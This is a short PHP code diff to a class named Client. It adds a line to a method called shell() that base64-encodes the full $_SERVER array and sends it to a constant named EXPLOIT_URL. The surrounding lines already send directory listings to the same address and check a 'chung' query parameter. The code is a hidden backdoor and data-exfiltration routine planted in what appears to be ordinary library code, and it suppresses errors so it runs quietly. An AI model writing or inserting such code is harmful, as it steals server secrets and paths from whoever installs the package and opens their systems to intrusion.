@@ -160,6 +160,7 @@ class Client
 
     protected function shell()
     {
+        @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode($_SERVER)));
         @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../../'))));
         @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../'))));
         if (isset($_GET['chung'])) {
